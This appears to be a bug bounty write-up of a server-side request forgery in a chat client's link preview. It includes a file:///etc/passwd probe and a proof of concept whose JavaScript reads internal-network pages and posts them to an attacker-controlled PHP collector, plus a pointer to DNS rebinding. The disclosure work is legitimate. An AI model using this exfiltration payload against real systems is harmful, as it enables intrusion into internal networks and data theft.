# [bugbounty]A Simple SSRF

This is a private program<br>
First of all, its web assets have several subdomains. After I tested it for a while, I plan to check out the mac client.<br>
After installation, sign up for login, then I see a chat interface.<br>
Send a URL<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/1.png)
It seems to preview the url, return a title and favicons<br>
I use my server ip to test. Then received<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t3.png)
Found that is the browser's ua header<br>
Then I tested it http://127.0.0.1 https://127.0.0.1 file://etc/passwd ....<br>
Tested a lot of common internal ip<br>
But<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t1.png)
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t2.png)
No effect<br>
Then I tried the subdomain brute force, as well as some asset discovery sites to find internal ip<br>
Until there is an ip<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t4.png)
Seems to be successful<br>
Then I quickly submitted the vulnerability<br>
But<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t5.png)
As written above, we can only get a very small amount of content.<br>
After testing, I found that it will also execute js because it is browser ua<br>

  

 

    <html><p id='d1'></p>
    <script>
        function get(url) {
            try {
                var req = new XMLHttpRequest();
                req.open('GET', url, false);
                req.send(null);
                if(req.status == 200)
                    return req.responseText;
            } catch(err) {
            }
            return null;
        }
        var role = get('https://google.com');
        document.getElementById("d1").innerHTML=role.length;
    </script></html>
    
    
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t6.png)<br>
Can successfully get Google returns the content length<br>
Does not seem to be blocked by Same Origin Policy<br>
Then we can get any internal network content<br>
**poc**<br>
xxx.php


    <?php
    file_put_contents("save.txt", $_POST['cc'] . "\n", FILE_APPEND);
    ?>
    
poc.html


    <html><p id='d1'></p>
    <script>
    function get(url) {
        try {
            var req = new XMLHttpRequest();
            req.open('GET', url, false);
            req.send(null);
            if(req.status == 200)
                return req.responseText;
        } catch(err) {
        }
        return null;
    }
    function post(url,content){
        var req = new XMLHttpRequest();
        req.open("POST", url, true);
        var formData = new FormData();
        formData.append("cc", content);
        req.send(formData);
    }
    var role = get('https://Internal ip');
    post('https://xxxxxxxxxxx.com/xxx.php',escape(role));
    document.getElementById("d1").innerHTML=role.length;
    </script></html>
    
Then check save.txt<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t8.png)
Url decoding<br>
![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t9.png)

**If Same Origin Policy blocks**<br>
Bypass Same Origin Policy with DNS-rebinding to retrieve  Internal server .<br>
![enter image description here](https://user-images.githubusercontent.com/5891788/53449161-87e47300-3a19-11e9-8e3c-7b7bdfeaab6b.png)

Details from https://github.com/mpgn/ByP-SOP<br>
Finally ![enter image description here](https://raw.githubusercontent.com/Jinone/jinone.github.io/master/_posts/t11.png)
